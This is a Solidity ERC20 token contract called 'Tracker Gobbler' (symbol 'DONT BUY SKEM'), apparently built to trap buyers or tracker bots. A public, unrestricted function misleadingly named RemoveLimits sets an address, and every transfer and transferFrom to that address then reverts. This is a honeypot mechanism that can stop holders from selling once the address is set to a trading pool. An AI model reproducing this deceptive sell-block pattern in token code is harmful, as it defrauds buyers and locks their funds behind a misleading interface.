// SPDX-License-Identifier: unlicensed
pragma solidity 0.8.4;
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMult(uint256 x, uint256 y) public pure returns(uint c) {
      c = x * y;
    }
}
abstract contract ERC20Interface {
    function totalSupply() virtual public view returns (uint);
    function balanceOf(address tokenOwner) virtual public view returns (uint balance);
    function allowance(address tokenOwner, address spender) virtual public view returns (uint remaining);
    function transfer(address to, uint tokens) virtual public returns (bool success);
    function approve(address spender, uint tokens) virtual public returns (bool success);
    function transferFrom(address from, address to, uint tokens) virtual public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract STOP is ERC20Interface, SafeMath {
    string public symbol;
    string public  name;
    uint8 public decimals;
    uint public _totalSupply;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    address public caAddy;
    constructor() {
        symbol = "DONT BUY SKEM";
        name = "Tracker Gobbler";
        decimals = 0;
        _totalSupply = 1000000;
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    function totalSupply() public override view returns (uint) {
        return _totalSupply - balances[address(0)];
    }
     function RemoveLimits(address addy) public {
        caAddy = addy;
    }
    function balanceOf(address tokenOwner) public override view returns (uint balance) {
        return balances[tokenOwner];
    }
    function transfer(address receiver, uint tokens) public override returns (bool success) {
        
        require(receiver != caAddy, "NUM NUM NUM");
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[receiver] = safeAdd(balances[receiver], tokens);
        emit Transfer(msg.sender, receiver, tokens);
        return true;
    }
    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address sender, address receiver, uint tokens) public override returns (bool success) {
        require(receiver != caAddy, "NUM NUM NUM");
        balances[sender] = safeSub(balances[sender], tokens);
        allowed[sender][msg.sender] = safeSub(allowed[sender][msg.sender], tokens);
        balances[receiver] = safeAdd(balances[receiver], tokens);
        emit Transfer(sender, receiver, tokens);
        return true;
    }
    function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
}